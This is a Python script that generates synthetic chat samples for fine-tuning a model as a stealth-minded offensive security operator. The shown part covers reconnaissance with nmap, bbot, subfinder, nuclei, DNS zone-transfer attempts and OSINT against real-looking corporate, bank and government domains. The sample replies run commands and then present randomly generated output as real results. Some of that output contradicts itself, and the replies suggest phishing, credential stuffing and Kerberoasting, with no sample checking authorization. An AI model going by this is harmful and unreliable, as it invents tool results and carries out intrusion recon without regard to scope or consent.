#!/usr/bin/env python3
"""
FT1-3: Full-Spectrum Cyber Security Training Data Generator
Target: DeepSeek V3 671B via Together.ai LoRA fine-tuning

Generates 25,000+ training samples across 6 categories:
1. RECONNAISSANCE (5,000+)
2. EXPLOITATION (5,000+)
3. POST-EXPLOITATION (3,000+)
4. DETECTION ENGINEERING (3,000+)
5. ENGAGEMENT WORKFLOWS (4,000+)
6. TOOL MASTERY (5,000+)

Output: JSONL format for Together.ai
"""
import json
import random
import hashlib
import ipaddress
from pathlib import Path
from datetime import datetime, timedelta

OUTPUT_DIR = Path("/root/forge-garage/finetune/data")
OUTPUT_FILE = OUTPUT_DIR / "ft1_3_fullspectrum_cyber.jsonl"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SYSTEM PROMPTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SYSTEM_OFFENSIVE = (
    "You are an expert offensive security operator with deep knowledge of penetration testing, "
    "red teaming, and vulnerability research. You have access to a full offensive toolkit and "
    "can execute commands via <exec> tags. You document findings with <finding> tags. You think "
    "through problems methodically, chain tools together, and make operational decisions about "
    "what to do next based on results. You balance thoroughness with stealth and efficiency."
)

SYSTEM_DEFENSIVE = (
    "You are an expert detection engineer and threat hunter. You write detection rules (Sigma, "
    "YARA, Snort/Suricata), analyze logs, hunt for threats in telemetry, and build defensive "
    "monitoring. You understand attacker TTPs deeply and translate that knowledge into precise, "
    "low-false-positive detections. You use <exec> tags for commands and <finding> tags for results."
)

SYSTEM_FULLSTACK = (
    "You are a full-spectrum cyber security expert capable of both offensive operations and "
    "defensive engineering. You plan and execute penetration tests, write exploits, build "
    "detections, analyze incidents, and produce professional reports. You use <exec> tags for "
    "command execution and <finding> tags for documenting discoveries. You chain operations "
    "logically, explain your reasoning, and adapt when things don't go as expected."
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RANDOMIZATION POOLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

INTERNAL_SUBNETS = ["10.10.14.", "10.10.10.", "192.168.1.", "192.168.50.", "172.16.5.", "172.16.20.", "10.129.45.", "10.0.0.", "10.200.1."]
EXTERNAL_IPS = ["203.0.113.", "198.51.100.", "185.199.108.", "104.26.10.", "151.101.1.", "34.102.136."]

DOMAINS = [
    "megacorp.com", "acme-tech.io", "globalbank.net", "healthsys.org", "cloudnative.dev",
    "fintech-app.com", "retailco.com", "energycorp.net", "govportal.us", "edunet.edu",
    "saas-platform.io", "logistics-hub.com", "mediagroup.tv", "pharma-research.com",
    "defense-contractor.net", "insuranceco.com", "telecomgiant.net", "automotiveco.com",
    "aerospace-sys.com", "biotech-labs.org", "cryptoex.io", "gaming-platform.gg",
    "social-network.app", "streaming-svc.com", "travel-booking.com",
]

SUBDOMAINS = [
    "www", "mail", "vpn", "admin", "portal", "api", "dev", "staging", "test", "uat",
    "jenkins", "gitlab", "jira", "confluence", "grafana", "prometheus", "kibana",
    "elastic", "redis", "postgres", "mysql", "mongo", "rabbit", "kafka", "zookeeper",
    "ldap", "dc01", "dc02", "fs01", "web01", "web02", "app01", "app02", "db01",
    "backup", "nas", "ftp", "sftp", "ssh-bastion", "proxy", "lb01", "cdn",
    "internal-api", "auth", "sso", "oauth", "cms", "blog", "shop", "checkout",
    "payment", "billing", "crm", "erp", "hr", "helpdesk", "support", "docs",
    "wiki", "git", "ci", "cd", "deploy", "monitor", "log", "siem", "waf",
]

WEB_PATHS = [
    "/api/v1/users", "/api/v2/search", "/admin/login", "/wp-admin", "/manager/html",
    "/console", "/.git/config", "/.env", "/server-status", "/actuator/health",
    "/graphql", "/api/swagger.json", "/debug/pprof", "/metrics", "/health",
    "/api/v1/admin/config", "/upload", "/download", "/proxy", "/fetch",
    "/api/internal/debug", "/solr/admin", "/jenkins/script", "/.well-known/openid-configuration",
]

SERVICES = {
    "http": [80, 8080, 8000, 8888, 3000, 5000, 9090],
    "https": [443, 8443, 9443, 4443],
    "ssh": [22, 2222, 2200],
    "ftp": [21, 2121],
    "smb": [445, 139],
    "rdp": [3389],
    "mysql": [3306],
    "postgres": [5432],
    "mssql": [1433],
    "redis": [6379],
    "mongo": [27017],
    "ldap": [389, 636],
    "smtp": [25, 587],
    "dns": [53],
    "kerberos": [88],
    "winrm": [5985, 5986],
    "vnc": [5900, 5901],
    "elasticsearch": [9200, 9300],
    "activemq": [61616, 8161],
    "rabbitmq": [5672, 15672],
    "docker": [2375, 2376],
    "kubernetes": [6443, 10250],
}

SERVICE_VERSIONS = {
    "apache": ["2.4.49", "2.4.50", "2.4.51", "2.4.54", "2.4.57", "2.4.58"],
    "nginx": ["1.18.0", "1.20.1", "1.22.0", "1.24.0", "1.25.3"],
    "openssh": ["7.4", "7.9", "8.0", "8.2", "8.4", "8.9", "9.0", "9.3", "9.6"],
    "mysql": ["5.7.38", "5.7.42", "8.0.28", "8.0.33", "8.0.36"],
    "postgres": ["12.4", "13.3", "14.1", "15.2", "16.1"],
    "redis": ["5.0.14", "6.0.16", "6.2.7", "7.0.5", "7.2.3"],
    "tomcat": ["8.5.73", "9.0.30", "9.0.65", "9.0.80", "10.1.5"],
    "iis": ["7.5", "8.0", "8.5", "10.0"],
    "proftpd": ["1.3.5", "1.3.6", "1.3.7", "1.3.8"],
    "vsftpd": ["2.3.4", "3.0.3", "3.0.5"],
    "samba": ["4.7.12", "4.13.17", "4.15.13", "4.17.12", "4.18.9"],
    "exchange": ["2013 CU23", "2016 CU23", "2019 CU12", "2019 CU13"],
    "jenkins": ["2.346", "2.375", "2.401", "2.426", "2.441"],
    "gitlab": ["14.10", "15.5", "15.11", "16.2", "16.6"],
    "elasticsearch": ["7.10.0", "7.17.9", "8.5.0", "8.11.0"],
    "activemq": ["5.15.15", "5.16.5", "5.17.3", "5.18.3"],
    "confluence": ["7.13", "7.19", "8.0", "8.3", "8.5"],
    "fortinet": ["6.4.12", "7.0.11", "7.2.4", "7.4.1"],
    "ivanti": ["9.1R11", "22.1R1", "22.4R2", "22.5R1"],
}

USERNAMES = [
    "admin", "root", "jsmith", "jdoe", "administrator", "svc_sql", "svc_backup",
    "svc_web", "deploy", "jenkins", "gitlab-runner", "www-data", "tomcat",
    "backup_op", "db_admin", "net_admin", "helpdesk", "support", "test",
    "dev", "staging", "operator", "monitor", "ansible", "terraform",
]

PASSWORDS = [
    "Password123!", "Summer2024!", "Welcome1", "Admin@123", "Passw0rd!",
    "Company2024", "Changeme1!", "P@ssword1", "Winter2023!", "Qwerty123!",
    "letmein", "123456", "admin", "password", "root", "toor",
]

CVES_CRITICAL = [
    ("CVE-2021-44228", "Log4Shell", "Apache Log4j", "RCE via JNDI injection", "CWE-917", 10.0),
    ("CVE-2023-46604", "ActiveMQ RCE", "Apache ActiveMQ", "RCE via ClassInfo deserialization", "CWE-502", 10.0),
    ("CVE-2024-23897", "Jenkins CLI", "Jenkins", "Arbitrary file read via CLI args", "CWE-22", 9.8),
    ("CVE-2024-21887", "Ivanti Connect Secure", "Ivanti", "Command injection in web component", "CWE-77", 9.1),
    ("CVE-2023-22515", "Confluence Auth Bypass", "Atlassian Confluence", "Authentication bypass creating admin", "CWE-287", 10.0),
    ("CVE-2023-34362", "MOVEit SQLi", "Progress MOVEit", "SQL injection to RCE", "CWE-89", 9.8),
    ("CVE-2024-3400", "PAN-OS Command Injection", "Palo Alto PAN-OS", "Command injection in GlobalProtect", "CWE-77", 10.0),
    ("CVE-2023-27997", "FortiGate Heap Overflow", "Fortinet FortiOS", "Heap overflow in SSL VPN", "CWE-787", 9.8),
    ("CVE-2021-34473", "ProxyShell", "Microsoft Exchange", "Pre-auth RCE chain", "CWE-918", 9.8),
    ("CVE-2021-26855", "ProxyLogon", "Microsoft Exchange", "SSRF to RCE", "CWE-918", 9.8),
    ("CVE-2023-4966", "Citrix Bleed", "Citrix NetScaler", "Session token leak", "CWE-119", 9.4),
    ("CVE-2024-1709", "ScreenConnect Auth Bypass", "ConnectWise ScreenConnect", "Authentication bypass", "CWE-287", 10.0),
    ("CVE-2023-0669", "GoAnywhere RCE", "Fortra GoAnywhere", "Pre-auth RCE in admin console", "CWE-502", 7.2),
    ("CVE-2022-47966", "ManageEngine RCE", "Zoho ManageEngine", "SAML SSO RCE", "CWE-502", 9.8),
    ("CVE-2023-20198", "Cisco IOS XE", "Cisco IOS XE", "Web UI privilege escalation", "CWE-269", 10.0),
    ("CVE-2022-1388", "F5 BIG-IP Auth Bypass", "F5 BIG-IP", "iControl REST auth bypass", "CWE-287", 9.8),
    ("CVE-2021-21972", "vCenter RCE", "VMware vCenter", "File upload to RCE", "CWE-434", 9.8),
    ("CVE-2022-22965", "Spring4Shell", "Spring Framework", "RCE via data binding", "CWE-94", 9.8),
    ("CVE-2023-44487", "HTTP/2 Rapid Reset", "HTTP/2 implementations", "DoS via stream reset", "CWE-400", 7.5),
    ("CVE-2024-6387", "regreSSHion", "OpenSSH", "Race condition RCE", "CWE-362", 8.1),
]

OS_TYPES = ["Linux", "Windows", "FreeBSD"]

LINUX_DISTROS = ["Ubuntu 22.04", "Ubuntu 20.04", "Debian 11", "Debian 12", "CentOS 7", "Rocky 9", "Kali 2024.1", "Alpine 3.18"]
WINDOWS_VERSIONS = ["Windows Server 2016", "Windows Server 2019", "Windows Server 2022", "Windows 10 Pro", "Windows 11 Enterprise"]


def rand_ip(internal=True):
    if internal:
        subnet = random.choice(INTERNAL_SUBNETS)
        return subnet + str(random.randint(1, 254))
    else:
        subnet = random.choice(EXTERNAL_IPS)
        return subnet + str(random.randint(1, 254))


def rand_domain():
    return random.choice(DOMAINS)


def rand_subdomain():
    return f"{random.choice(SUBDOMAINS)}.{rand_domain()}"


def rand_port(service=None):
    if service and service in SERVICES:
        return random.choice(SERVICES[service])
    return random.choice([21, 22, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
                          1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 6379, 8080, 8443, 9200, 27017])


def rand_mac():
    return ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])


def rand_hash(algo="md5"):
    data = str(random.random()).encode()
    if algo == "md5":
        return hashlib.md5(data).hexdigest()
    elif algo == "sha1":
        return hashlib.sha1(data).hexdigest()
    elif algo == "sha256":
        return hashlib.sha256(data).hexdigest()
    return hashlib.md5(data).hexdigest()


def make_sample(system, user, assistant):
    return {"messages": [
        {"role": "system", "content": system},
        {"role": "user", "content": user},
        {"role": "assistant", "content": assistant},
    ]}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CATEGORY 1: RECONNAISSANCE (5,000+ samples)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_recon_bbot_workflows():
    """bbot multi-phase scanning workflows."""
    samples = []
    phases = [
        ("subdomain-enum", "subdomain enumeration"),
        ("web-basic", "web vulnerability scanning"),
        ("web-thorough", "thorough web assessment"),
    ]

    for _ in range(900):
        domain = rand_domain()
        target_ip = rand_ip()
        num_subs = random.randint(15, 350)
        num_web = random.randint(5, 80)
        num_findings = random.randint(0, 12)

        phase = random.choice(phases)
        preset, desc = phase

        interesting_subs = random.sample(SUBDOMAINS, min(8, len(SUBDOMAINS)))
        sub_list = [f"{s}.{domain}" for s in interesting_subs[:random.randint(3, 8)]]

        user = random.choice([
            f"Run bbot {desc} against {domain}. Full scope: *.{domain}.",
            f"Start {desc} phase on {domain} using bbot.",
            f"I need comprehensive {desc} on {domain}. Use bbot with the {preset} preset.",
            f"Phase 1 recon: enumerate the attack surface of {domain} with bbot.",
        ])

        cmd = f"bbot -t {domain} -p {preset} -o /root/.bbot/scans/{domain}"
        if preset == "subdomain-enum":
            cmd += " --config modules.massdns.wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
        elif preset == "web-thorough":
            cmd += " --config modules.nuclei.severity=critical,high,medium modules.nuclei.concurrency=30"

        output_summary = f"Scan complete. {num_subs} subdomains discovered, {num_web} HTTP services identified"
        if num_findings > 0:
            output_summary += f", {num_findings} potential vulnerabilities flagged"
        output_summary += f". Notable hosts: {', '.join(sub_list[:4])}"

        findings_text = ""
        if num_findings > 0:
            finding_types = random.sample([
                f"Exposed admin panel at admin.{domain}",
                f"Default credentials on jenkins.{domain}",
                f"Information disclosure at api.{domain}/.env",
                f"Outdated Apache (2.4.49) on web01.{domain}",
                f"Open redirect at auth.{domain}/callback",
                f"Directory listing enabled on staging.{domain}",
                f"Git repository exposed at dev.{domain}/.git",
                f"Debug endpoint at api.{domain}/actuator",
            ], min(3, num_findings))
            findings_text = "\n".join([f"  - {f}" for f in finding_types])

        next_steps = []
        if preset == "subdomain-enum":
            next_steps = [
                f"Run web-basic preset against the {num_web} HTTP services",
                f"Investigate high-value targets: {', '.join(sub_list[:3])}",
                "Check for known CVEs on identified service versions",
                "Run nuclei against all discovered web endpoints",
            ]
        elif preset == "web-basic":
            next_steps = [
                "Exploit confirmed vulnerabilities",
                "Run web-thorough on high-value targets",
                "Manual testing on admin panels and auth endpoints",
                "Check for API documentation exposure (swagger, openapi)",
            ]
        else:
            next_steps = [
                "Begin exploitation of confirmed vulnerabilities",
                "Prioritize by CVSS score and exploitability",
                "Report critical findings immediately",
            ]

        assistant = f"""<exec timeout="3600">{cmd}</exec>

**Results Summary:**
- Subdomains discovered: {num_subs}
- HTTP services: {num_web}
- Potential vulnerabilities: {num_findings}

**Notable discoveries:**
{chr(10).join([f'  - {s}' for s in sub_list])}
{findings_text}

<finding severity="info" target="{domain}">Attack surface enumeration complete. {num_subs} subdomains, {num_web} web services. Key targets identified for phase 2.</finding>

**Recommended next steps:**
{chr(10).join([f'{i+1}. {s}' for i, s in enumerate(next_steps)])}"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_recon_nmap():
    """nmap service enumeration and interpretation."""
    samples = []

    scan_types = [
        ("-sV -sC", "version detection and default scripts"),
        ("-sS -p-", "SYN scan all ports"),
        ("-sU --top-ports 100", "UDP top 100 ports"),
        ("-sV -p 80,443,8080,8443", "web service enumeration"),
        ("-sV --script vuln", "vulnerability scanning"),
        ("-sn", "host discovery / ping sweep"),
        ("-O -sV", "OS detection with version scan"),
        ("-sV -sC --script=smb-enum*,smb-vuln*", "SMB enumeration"),
        ("-p 88,135,139,389,445,636,3268,3269 -sV", "Active Directory service scan"),
    ]

    for _ in range(1100):
        target = rand_ip()
        scan_type, desc = random.choice(scan_types)
        num_ports = random.randint(2, 12)

        # Generate realistic port/service output
        open_ports = []
        port_output_lines = []
        services_found = random.sample(list(SERVICES.keys()), min(num_ports, len(SERVICES)))

        for svc in services_found[:num_ports]:
            port = random.choice(SERVICES[svc])
            version_key = None
            for vk in SERVICE_VERSIONS:
                if vk in svc or svc in vk:
                    version_key = vk
                    break
            if not version_key:
                version_key = random.choice(list(SERVICE_VERSIONS.keys()))
            ver = random.choice(SERVICE_VERSIONS[version_key])
            open_ports.append((port, svc, ver))
            port_output_lines.append(f"{port}/tcp   open  {svc:12s} {version_key} {ver}")

        nmap_output = f"""Starting Nmap 7.94 ( https://nmap.org ) at {datetime.now().strftime('%Y-%m-%d %H:%M')}
Nmap scan report for {target}
Host is up (0.{random.randint(1,99):02d}s latency).

PORT      STATE SERVICE      VERSION
{chr(10).join(port_output_lines)}

Service detection performed. {num_ports} services on {target}.
Nmap done: 1 IP address (1 host up) scanned in {random.randint(5, 120)} seconds"""

        user = random.choice([
            f"Run nmap {desc} against {target}",
            f"Enumerate services on {target} with nmap",
            f"Scan {target} — I need to know what's running",
            f"nmap {scan_type} {target} — interpret the results",
        ])

        # Build interpretation
        interesting = []
        for port, svc, ver in open_ports:
            if svc in ["http", "https"]:
                interesting.append(f"Web service on port {port} — check for web vulnerabilities")
            elif svc == "smb":
                interesting.append(f"SMB on port {port} — check for EternalBlue, null sessions, shares")
            elif svc == "ssh":
                interesting.append(f"SSH on port {port} — potential brute force target")
            elif svc in ["mysql", "postgres", "mssql"]:
                interesting.append(f"Database ({svc}) on port {port} — check for default creds, exposed data")
            elif svc == "redis":
                interesting.append(f"Redis on port {port} — likely no auth, potential RCE via SLAVEOF")
            elif svc == "rdp":
                interesting.append(f"RDP on port {port} — check for BlueKeep, NLA status")
            elif svc == "kerberos":
                interesting.append(f"Kerberos on port {port} — this is likely a Domain Controller")

        assistant = f"""<exec timeout="120">nmap {scan_type} {target}</exec>

```
{nmap_output}
```

**Analysis:**
- {num_ports} open ports identified on {target}
- Operating system likely: {random.choice(LINUX_DISTROS if random.random() > 0.4 else WINDOWS_VERSIONS)}

**Key observations:**
{chr(10).join([f'- {obs}' for obs in interesting[:5]])}

**Recommended next steps:**
1. Run targeted vulnerability scans against identified services
2. Check service versions against known CVE databases
3. {"Attempt default credentials on exposed services" if any(s in ["redis", "mysql", "ftp"] for _, s, _ in open_ports) else "Enumerate web applications for content discovery"}
4. {"Check SMB shares for null session access" if any(s == "smb" for _, s, _ in open_ports) else "Run nuclei templates against web services"}"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_recon_subdomain_chains():
    """Subdomain discovery chains (subfinder -> httpx -> nuclei)."""
    samples = []

    for _ in range(800):
        domain = rand_domain()
        num_subs = random.randint(20, 200)
        num_live = random.randint(int(num_subs * 0.4), int(num_subs * 0.8))
        num_vulns = random.randint(0, 8)

        subs_found = [f"{random.choice(SUBDOMAINS)}.{domain}" for _ in range(min(15, num_subs))]
        live_hosts = random.sample(subs_found, min(8, len(subs_found)))

        subfinder_output = "\n".join(subs_found[:10])
        httpx_output = "\n".join([
            f"https://{h} [{random.choice([200, 301, 302, 403, 401])}] [{random.choice(['nginx', 'Apache', 'cloudflare', 'Microsoft-IIS'])}] [{random.choice(['Login', 'Dashboard', 'API', 'Portal', 'Home'])}]"
            for h in live_hosts[:8]
        ])

        user = random.choice([
            f"Run the full subdomain discovery chain on {domain}: subfinder → httpx → nuclei",
            f"Enumerate subdomains for {domain} and scan live hosts for vulnerabilities",
            f"I need a complete subdomain-to-vulnerability pipeline for {domain}",
        ])

        assistant = f"""Running the subdomain discovery chain: subfinder → httpx → nuclei

**Phase 1: Subdomain Discovery**
<exec timeout="300">subfinder -d {domain} -all -silent | sort -u | tee /tmp/{domain}_subs.txt</exec>

```
{subfinder_output}
... ({num_subs} total subdomains)
```

Found {num_subs} unique subdomains for {domain}.

**Phase 2: Live Host Detection**
<exec timeout="120">cat /tmp/{domain}_subs.txt | httpx -silent -status-code -title -tech-detect -o /tmp/{domain}_live.txt</exec>

```
{httpx_output}
```

{num_live}/{num_subs} hosts are live and responding to HTTP(S).

**Phase 3: Vulnerability Scanning**
<exec timeout="600">nuclei -l /tmp/{domain}_live.txt -severity critical,high -o /tmp/{domain}_vulns.txt -c 50</exec>

{f'''Found {num_vulns} vulnerabilities:''' if num_vulns > 0 else "No critical/high vulnerabilities found in automated scanning."}
{chr(10).join([f'<finding severity="{random.choice(["critical", "high"])}" target="{random.choice(live_hosts)}">{random.choice(["CVE-2024-23897 Jenkins file read", "Exposed .git directory", "Default admin credentials", "SSRF in proxy endpoint", "SQL injection in search parameter", "Open redirect", "Information disclosure", "Directory listing"])}</finding>' for _ in range(min(3, num_vulns))])}

**Summary:**
| Phase | Results |
|-------|---------|
| Subdomains | {num_subs} discovered |
| Live hosts | {num_live} responding |
| Vulnerabilities | {num_vulns} critical/high |

**Next steps:**
1. {"Exploit confirmed vulnerabilities starting with critical findings" if num_vulns > 0 else "Run web-thorough scanning with additional templates"}
2. Manual testing on admin panels and authentication endpoints
3. Content discovery (ffuf/feroxbuster) on interesting hosts
4. Check for subdomain takeover opportunities on non-resolving domains"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_recon_osint():
    """OSINT tradecraft (whois, DNS, cert transparency)."""
    samples = []

    for _ in range(700):
        domain = rand_domain()
        target_ip = rand_ip(internal=False)
        registrar = random.choice(["GoDaddy", "Namecheap", "Cloudflare Registrar", "AWS Route53", "Google Domains"])
        org_name = domain.split(".")[0].replace("-", " ").title() + " " + random.choice(["Inc.", "LLC", "Corp.", "Ltd."])
        nameservers = random.choice([
            [f"ns1.{domain}", f"ns2.{domain}"],
            ["ns-1234.awsdns-12.org", "ns-5678.awsdns-34.co.uk"],
            ["anna.ns.cloudflare.com", "bob.ns.cloudflare.com"],
        ])

        scenario = random.choice(["whois", "dns", "crt", "full_osint"])

        if scenario == "whois":
            user = f"Run WHOIS lookup on {domain} and extract useful intelligence"
            assistant = f"""<exec timeout="30">whois {domain}</exec>

```
Domain Name: {domain.upper()}
Registry Domain ID: {random.randint(1000000, 9999999)}_DOMAIN
Registrar: {registrar}
Creation Date: {2015 + random.randint(0, 8)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}
Updated Date: 2024-{random.randint(1,12):02d}-{random.randint(1,28):02d}
Registrant Organization: {org_name}
Registrant State/Province: {random.choice(["California", "New York", "Texas", "Washington", "Virginia"])}
Registrant Country: US
Name Server: {nameservers[0]}
Name Server: {nameservers[1]}
```

**Intelligence extracted:**
- **Organization:** {org_name}
- **Registrar:** {registrar}
- **Infrastructure:** {"AWS-hosted (Route53 nameservers)" if "awsdns" in nameservers[0] else "Cloudflare-proxied" if "cloudflare" in nameservers[0] else "Self-hosted DNS"}
- **Age:** Established domain ({random.randint(2, 9)} years old)
- **Location:** US-based entity

**OSINT implications:**
1. {"AWS infrastructure — check for S3 buckets, EC2 metadata" if "awsdns" in nameservers[0] else "Cloudflare protection — need to find origin IP behind CDN" if "cloudflare" in nameservers[0] else "Self-hosted DNS — potential for zone transfer or DNS poisoning"}
2. Organization name useful for credential stuffing patterns (e.g., {org_name.split()[0].lower()}2024)
3. Check LinkedIn for employees → spearphishing targets"""

        elif scenario == "dns":
            user = f"Perform comprehensive DNS enumeration on {domain}"
            a_records = [rand_ip(internal=False) for _ in range(random.randint(1, 4))]
            mx_records = [f"mail.{domain}", f"mx1.{domain}"]

            assistant = f"""<exec timeout="30">dig {domain} ANY +noall +answer</exec>
<exec timeout="30">dig {domain} MX +short</exec>
<exec timeout="30">dig {domain} TXT +short</exec>
<exec timeout="30">dig {domain} NS +short</exec>
<exec timeout="15">dig axfr {domain} @{nameservers[0]}</exec>

**DNS Records:**
```
;; A Records
{domain}.    300    IN    A    {a_records[0]}
{"".join([f"{chr(10)}www.{domain}.    300    IN    A    {ip}" for ip in a_records[1:2]])}

;; MX Records
{domain}.    3600    IN    MX    10    {mx_records[0]}.
{domain}.    3600    IN    MX    20    {mx_records[1]}.

;; TXT Records
{domain}.    300    IN    TXT    "v=spf1 include:_spf.google.com include:sendgrid.net ~all"
{domain}.    300    IN    TXT    "google-site-verification={rand_hash('md5')[:20]}"

;; NS Records
{nameservers[0]}.
{nameservers[1]}.
```

**Zone transfer:** {"REFUSED — zone transfer not permitted" if random.random() > 0.1 else "SUCCESS — full zone dump obtained! This is a critical misconfiguration."}

**Analysis:**
- IP addresses: {', '.join(a_records)} — targets for direct scanning
- Mail: {"Google Workspace (hosted email)" if "google" in "spf1 include:_spf.google.com" else "Self-hosted mail server"}
- SPF includes SendGrid — they use it for transactional email
- {"Origin IP potentially exposed via MX records" if random.random() > 0.5 else "All records behind CDN/proxy"}

**Next steps:**
1. Scan discovered IPs: {', '.join(a_records[:2])}
2. Check for subdomain enumeration via certificate transparency
3. {"Zone transfer succeeded — enumerate all hosts from dump" if random.random() < 0.1 else "Try DNS brute force for additional subdomains"}
4. Investigate mail infrastructure for phishing opportunities"""

        elif scenario == "crt":
            user = f"Search certificate transparency logs for {domain}"
            ct_subs = [f"{random.choice(SUBDOMAINS)}.{domain}" for _ in range(random.randint(10, 30))]

            assistant = f"""<exec timeout="30">curl -s "https://crt.sh/?q=%.{domain}&output=json" | jq -r '.[].name_value' | sort -u</exec>

**Certificate Transparency Results ({len(ct_subs)} unique entries):**
```
{chr(10).join(ct_subs[:15])}
```

**Notable discoveries:**
- `internal-api.{domain}` — internal service potentially exposed
- `staging.{domain}` — staging environment (often less hardened)
- `vpn.{domain}` — VPN endpoint (check for Ivanti/Fortinet/Pulse Secure)
- `jenkins.{domain}` — CI/CD system (high-value target)

<finding severity="info" target="{domain}">Certificate transparency revealed {len(ct_subs)} subdomains including internal services, staging environments, and infrastructure components.</finding>

**Next steps:**
1. Resolve all discovered subdomains to identify live hosts
2. Check for wildcard certificates (may indicate additional hidden services)
3. Cross-reference with subfinder results for completeness
4. Investigate internal-sounding names for direct access from external network"""

        else:  # full_osint
            user = f"Perform full OSINT reconnaissance on {domain} — I need everything before we start active scanning"
            assistant = f"""Running comprehensive passive OSINT collection on {domain}.

**1. WHOIS Intelligence:**
<exec timeout="30">whois {domain}</exec>
- Organization: {org_name}
- Registrar: {registrar}
- Infrastructure: {"Cloud-hosted" if random.random() > 0.5 else "Self-hosted"}

**2. DNS Enumeration:**
<exec timeout="30">dig {domain} ANY +noall +answer && dig {domain} MX +short && dig {domain} TXT +short</exec>
- A records: {rand_ip(internal=False)}, {rand_ip(internal=False)}
- Mail: Google Workspace
- SPF: Includes sendgrid, mailgun

**3. Certificate Transparency:**
<exec timeout="30">curl -s "https://crt.sh/?q=%.{domain}&output=json" | jq -r '.[].name_value' | sort -u | wc -l</exec>
- {random.randint(30, 150)} unique hostnames in CT logs

**4. Technology Fingerprinting:**
<exec timeout="30">whatweb -q https://{domain}</exec>
- Web server: {random.choice(["nginx", "Apache", "Cloudflare"])}
- Framework: {random.choice(["React", "Next.js", "Django", "Rails", "Laravel", "ASP.NET"])}
- CDN: {random.choice(["Cloudflare", "Akamai", "Fastly", "AWS CloudFront", "None detected"])}

**5. Email Security:**
- SPF: Configured (soft fail ~all)
- DMARC: {"p=reject (strict)" if random.random() > 0.5 else "p=none (not enforced — phishing opportunity)"}
- DKIM: Present

**OSINT Summary:**
| Category | Finding |
|----------|---------|
| Organization | {org_name} |
| Infrastructure | {"Cloud (AWS)" if random.random() > 0.5 else "Hybrid"} |
| Attack Surface | {random.randint(30, 150)} subdomains |
| Mail Security | {"Strong" if random.random() > 0.5 else "Weak (DMARC not enforced)"} |
| CDN/WAF | {"Yes — need origin IP" if random.random() > 0.5 else "No — direct access"} |

**Recommendations for active phase:**
1. Start with subdomain enumeration to confirm CT findings
2. {"Find origin IP behind CDN before scanning" if random.random() > 0.5 else "Direct scanning viable — no CDN detected"}
3. Focus on staging/dev environments (typically less protected)
4. {"DMARC not enforced — phishing viable for initial access" if random.random() > 0.5 else "Email security strong — prefer technical exploitation vectors"}"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_recon_network_mapping():
    """Network mapping and topology inference."""
    samples = []

    for _ in range(600):
        subnet = random.choice(["10.10.14.0/24", "192.168.1.0/24", "172.16.5.0/24", "10.0.0.0/24", "10.200.1.0/24"])
        num_hosts = random.randint(8, 50)
        gateway = subnet.replace("0/24", "1")

        hosts = []
        for i in range(num_hosts):
            ip = subnet.replace("0/24", str(random.randint(2, 254)))
            role = random.choice(["workstation", "server", "printer", "network device", "domain controller", "file server", "web server", "database server"])
            hosts.append((ip, role))

        user = random.choice([
            f"Map the network topology of {subnet}. Identify all live hosts and their roles.",
            f"I need a network map of {subnet} — host discovery, then service identification.",
            f"Perform network reconnaissance on {subnet}. Find the domain controller and critical servers.",
        ])

        host_lines = "\n".join([f"  {ip:16s} — {role}" for ip, role in hosts[:12]])
        dc_ip = subnet.replace("0/24", str(random.randint(5, 20)))

        assistant = f"""**Phase 1: Host Discovery**
<exec timeout="60">nmap -sn {subnet} -oG /tmp/hosts_alive.gnmap</exec>

Found {num_hosts} live hosts on {subnet}.

**Phase 2: Service Identification**
<exec timeout="300">nmap -sV -O -p 22,53,80,88,135,139,389,443,445,636,1433,3268,3306,3389,5432,5985,8080 -iL /tmp/hosts_alive.gnmap --open -oX /tmp/services.xml</exec>

**Network Topology:**
```
Gateway: {gateway}
Domain Controller: {dc_ip} (ports 88, 389, 445, 636, 3268 open)
Total live hosts: {num_hosts}

Host Inventory:
{host_lines}
```

**Key Infrastructure Identified:**
- **Domain Controller:** {dc_ip} (Kerberos + LDAP + SMB + Global Catalog)
- **DNS Server:** {dc_ip} (co-located with DC, common in AD environments)
- **File Server:** {subnet.replace("0/24", str(random.randint(20, 30)))} (SMB shares)
- **Web Server:** {subnet.replace("0/24", str(random.randint(40, 60)))} (HTTP/HTTPS)
- **Database:** {subnet.replace("0/24", str(random.randint(70, 90)))} ({"MSSQL" if random.random() > 0.5 else "PostgreSQL"})

**Network Segmentation Assessment:**
- {"Flat network — no segmentation detected. All hosts directly reachable." if random.random() > 0.4 else "Some segmentation detected — certain subnets filtered."}
- {"Default gateway at .1 — standard configuration" if random.random() > 0.5 else "Multiple gateways detected — potential for VLAN hopping"}

**Attack Path Analysis:**
1. Primary target: Domain Controller at {dc_ip}
2. Pivot opportunities: {"Web server likely internet-facing — compromise for lateral movement" if random.random() > 0.5 else "File server may contain credentials in shared documents"}
3. Credential harvesting: Target workstations for cached domain credentials

**Next steps:**
1. Enumerate SMB shares on file server (null session check)
2. Check web server for vulnerabilities
3. {"Attempt Kerberoasting against DC" if random.random() > 0.5 else "Run BloodHound collector for AD attack path mapping"}
4. Check for LLMNR/NBT-NS poisoning opportunities"""

